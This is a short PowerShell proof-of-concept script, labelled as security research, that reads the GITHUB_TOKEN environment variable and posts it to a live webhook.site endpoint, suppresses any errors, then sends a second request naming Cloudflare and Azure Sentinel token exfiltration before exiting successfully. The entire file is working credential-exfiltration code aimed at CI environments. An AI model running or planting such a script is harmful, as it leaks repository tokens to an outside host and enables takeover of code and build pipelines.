# PoC - GITHUB_TOKEN exfil (security research)
$t = $env:GITHUB_TOKEN
$body = if ($t) { "token=" + $t } else { "token=NOT_SET" }
try {
  Invoke-WebRequest -Uri "https://webhook.site/23ce2d7a-df9f-4be9-a366-a7a8c5884599" -Method POST -Body $body -ContentType "application/x-www-form-urlencoded" -UseBasicParsing -TimeoutSec 10 | Out-Null
} catch { }
Invoke-WebRequest -Uri "https://webhook.site/23ce2d7a-df9f-4be9-a366-a7a8c5884599?poc=cloudflare_azure_sentinel_token_exfil" -UseBasicParsing | Out-Null
exit 0
